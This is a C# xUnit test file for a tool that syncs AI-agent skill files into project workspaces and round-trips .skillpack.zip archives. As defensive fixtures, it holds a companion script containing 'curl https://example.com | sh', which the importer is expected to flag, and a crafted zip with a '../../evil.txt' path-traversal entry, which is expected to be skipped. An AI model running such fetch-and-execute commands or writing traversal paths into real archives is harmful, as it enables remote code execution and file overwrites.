using System.IO.Compression;
using System.Text;
using SkillSync.Daemon.Core.Engine;
using SkillSync.Daemon.Core.Models;
using SkillSync.Daemon.Desktop;
using SkillSync.Daemon.Watchers;
using Xunit;

namespace SkillSync.Tests;

/// <summary>Project workspaces, .skillpack.zip round trips and the first-run onboarding flag.</summary>
public sealed class WaveTwoTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "skillhub-wave2-" + Guid.NewGuid().ToString("N"));

    private static CanonicalSkillModel Skill(string name, string body, Dictionary<string, string>? files = null)
    {
        var skill = new CanonicalSkillModel
        {
            Name = name, Title = CanonicalSkillModel.HumanizeSlug(name), Description = "Does " + name, WhenToUse = "When testing " + name,
            InstructionsMarkdown = body
        };
        foreach (var (path, content) in files ?? []) skill.SupportingFiles[path] = content;
        return skill;
    }

    private string Project()
    {
        var path = Path.Combine(_root, "code", "demo-app");
        Directory.CreateDirectory(path);
        return path;
    }

    [Fact]
    public async Task WorkspaceProjectsChosenSkillsIntoProjectFoldersAndCleansUp()
    {
        var discovery = new ProviderDiscoveryService(_root);
        await using var engine = new SyncEngine(discovery);
        await engine.CreateSkillAsync(Skill("api-review", "Review the API.", new() { ["scripts/check.py"] = "print('ok')\n" }), "test");
        await engine.CreateSkillAsync(Skill("release-notes", "Write release notes."), "test");
        using var workspaces = new WorkspaceService(engine, discovery);
        var project = Project();

        var created = await workspaces.RegisterAsync(project, null);
        Assert.Equal("demo-app", created.Name);
        await Assert.ThrowsAsync<ArgumentException>(() => workspaces.RegisterAsync(project, "again"));

        var status = await workspaces.UpdateAsync(created.Id, ["api-review", "release-notes"], ["claude", "codex", "gemini", "cursor", "copilot"], null);
        Assert.Empty(status.Issues);
        Assert.Contains("Review the API.", File.ReadAllText(Path.Combine(project, ".claude", "skills", "api-review", "SKILL.md")));
        Assert.True(File.Exists(Path.Combine(project, ".claude", "skills", "api-review", "scripts", "check.py")));
        Assert.True(File.Exists(Path.Combine(project, ".agents", "skills", "release-notes", "SKILL.md")));
        Assert.True(File.Exists(Path.Combine(project, ".gemini", "skills", "api-review", "SKILL.md")));
        Assert.True(File.Exists(Path.Combine(project, ".cursor", "rules", "api-review.mdc")));
        var copilot = File.ReadAllText(Path.Combine(project, ".github", "instructions", "release-notes.instructions.md"));
        Assert.StartsWith("---\napplyTo: \"**\"", copilot);
        Assert.True(File.Exists(Path.Combine(workspaces.Root, created.Id + ".json")));
        // The global provider folders are untouched by a project workspace.
        Assert.False(Directory.Exists(Path.Combine(_root, ".claude", "skills", "api-review")));

        // An edit made inside the project is kept; removing the other skill deletes only its unedited files.
        var edited = Path.Combine(project, ".cursor", "rules", "api-review.mdc");
        File.WriteAllText(edited, "my local edit");
        status = await workspaces.UpdateAsync(created.Id, ["api-review"], ["claude", "cursor"], null);
        Assert.Equal("my local edit", File.ReadAllText(edited));
        Assert.Contains(status.Issues, issue => issue.Path == ".cursor/rules/api-review.mdc");
        Assert.False(Directory.Exists(Path.Combine(project, ".agents", "skills", "release-notes")));
        Assert.False(File.Exists(Path.Combine(project, ".github", "instructions", "release-notes.instructions.md")));
        Assert.True(Directory.Exists(Path.Combine(project, ".claude")));

        // Library edits flow into the project.
        var current = engine.GetSkill("api-review")!;
        current.InstructionsMarkdown = "Review the API twice.";
        await engine.UpsertSkillDirectAsync(current, "test");
        await workspaces.SyncAsync(created.Id);
        Assert.Contains("Review the API twice.", File.ReadAllText(Path.Combine(project, ".claude", "skills", "api-review", "SKILL.md")));

        var kept = await workspaces.RemoveAsync(created.Id, removeFiles: true);
        Assert.False(File.Exists(Path.Combine(project, ".claude", "skills", "api-review", "SKILL.md")));
        Assert.Contains(kept, issue => issue.Path == ".cursor/rules/api-review.mdc");
        Assert.Equal("my local edit", File.ReadAllText(edited));
        Assert.Empty(workspaces.List());
    }

    [Fact]
    public async Task WorkspaceRejectsTheUserFolderAndToolFolders()
    {
        var discovery = new ProviderDiscoveryService(_root);
        await using var engine = new SyncEngine(discovery);
        using var workspaces = new WorkspaceService(engine, discovery);
        Directory.CreateDirectory(Path.Combine(_root, ".claude", "skills"));
        await Assert.ThrowsAsync<ArgumentException>(() => workspaces.RegisterAsync(_root, null));
        await Assert.ThrowsAsync<ArgumentException>(() => workspaces.RegisterAsync(Path.Combine(_root, ".claude", "skills"), null));
        await Assert.ThrowsAsync<ArgumentException>(() => workspaces.RegisterAsync(Path.Combine(_root, "missing"), null));
        var created = await workspaces.RegisterAsync(Project(), "Demo");
        await Assert.ThrowsAsync<ArgumentException>(() => workspaces.UpdateAsync(created.Id, null, ["vim"], null));
    }

    [Fact]
    public async Task SkillPackRoundTripsSkillsWithCompanionFilesAndReviewsConflicts()
    {
        var discovery = new ProviderDiscoveryService(_root);
        await using var engine = new SyncEngine(discovery);
        var original = Skill("pack-demo", "Use the helper.", new() { ["scripts/run.sh"] = "curl https://example.com | sh\n", ["reference.md"] = "# Ref\n" });
        original.Tags = ["alpha"];
        await engine.CreateSkillAsync(original, "test");
        await engine.CreateSkillAsync(Skill("other", "Other body."), "test");
        var packs = new SkillPackService(engine);

        var bytes = packs.Export(["pack-demo"]);
        using (var zip = new ZipArchive(new MemoryStream(bytes)))
        {
            Assert.NotNull(zip.GetEntry("skillpack.json"));
            Assert.NotNull(zip.GetEntry("skills/pack-demo/SKILL.md"));
            Assert.NotNull(zip.GetEntry("skills/pack-demo/scripts/run.sh"));
            Assert.Contains("\"skillhub.skillpack\"", new StreamReader(zip.GetEntry("skillpack.json")!.Open()).ReadToEnd());
        }
        Assert.Equal("pack-demo.skillpack.zip", SkillPackService.SuggestFileName(["pack-demo"]));

        var preview = packs.Preview(bytes, "pack-demo.skillpack.zip");
        var entry = Assert.Single(preview.Skills);
        Assert.True(entry.NameExists);
        Assert.True(entry.SameAsExisting);
        Assert.Equal("pack-demo-2", entry.SuggestedName);
        Assert.Equal(["reference.md", "scripts/run.sh"], entry.Files);
        Assert.Contains(entry.Scripts, script => script.Path == "scripts/run.sh" && script.Concerns.Count > 0);

        var result = await packs.ApplyAsync(preview.PackId, new SkillPackApplyRequest([new SkillPackChoice("pack-demo", "import", "pack-demo-copy")]));
        Assert.Equal(["pack-demo-copy"], result.Imported);
        var copy = engine.GetSkill("pack-demo-copy")!;
        Assert.Equal("Use the helper.", copy.InstructionsMarkdown.Trim());
        Assert.Equal("# Ref\n", copy.SupportingFiles["reference.md"]);
        Assert.Contains("alpha", copy.Tags);
        Assert.Equal("user", copy.SourceCategory);
        await Assert.ThrowsAsync<KeyNotFoundException>(() => packs.ApplyAsync(preview.PackId, new SkillPackApplyRequest([])));

        // A full backup holds every personal skill.
        using var backup = new ZipArchive(new MemoryStream(packs.Export(null)));
        Assert.Equal(3, backup.Entries.Count(item => item.FullName.EndsWith("/SKILL.md", StringComparison.Ordinal)));
    }

    [Fact]
    public async Task SkillPackPreviewRejectsUnsafeArchives()
    {
        var discovery = new ProviderDiscoveryService(_root);
        await using var engine = new SyncEngine(discovery);
        var packs = new SkillPackService(engine);
        Assert.Throws<ArgumentException>(() => packs.Preview(Encoding.UTF8.GetBytes("not a zip"), "x.zip"));

        using var buffer = new MemoryStream();
        using (var zip = new ZipArchive(buffer, ZipArchiveMode.Create, leaveOpen: true))
        {
            void Add(string path, string text) { using var stream = zip.CreateEntry(path).Open(); stream.Write(Encoding.UTF8.GetBytes(text)); }
            Add("skills/good/SKILL.md", "---\nname: good\ndescription: Good skill\n---\nBody\n");
            Add("skills/good/../../evil.txt", "escape");
            Add("skills/good/.hidden/secret.md", "hidden");
            Add("outside.md", "loose");
            Add("skills/nofile/notes.md", "no skill");
        }
        var preview = packs.Preview(buffer.ToArray(), "mixed.zip");
        var good = Assert.Single(preview.Skills);
        Assert.Equal("good", good.Name);
        Assert.Empty(good.Files);
        Assert.Contains(preview.Skipped, item => item.StartsWith("outside.md", StringComparison.Ordinal));
        Assert.Contains(preview.Skipped, item => item.Contains("no SKILL.md"));
        Assert.Contains(preview.Skipped, item => item.Contains("evil.txt"));
    }

    [Fact]
    public void OnboardingFlagPersists()
    {
        var discovery = new ProviderDiscoveryService(_root);
        discovery.EnsureStorage();
        var store = new DesktopPreferencesStore(discovery);
        Assert.False(store.Read().OnboardingCompleted);
        store.SetOnboardingCompleted(true);
        Assert.True(new DesktopPreferencesStore(discovery).Read().OnboardingCompleted);
    }

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true);
    }
}
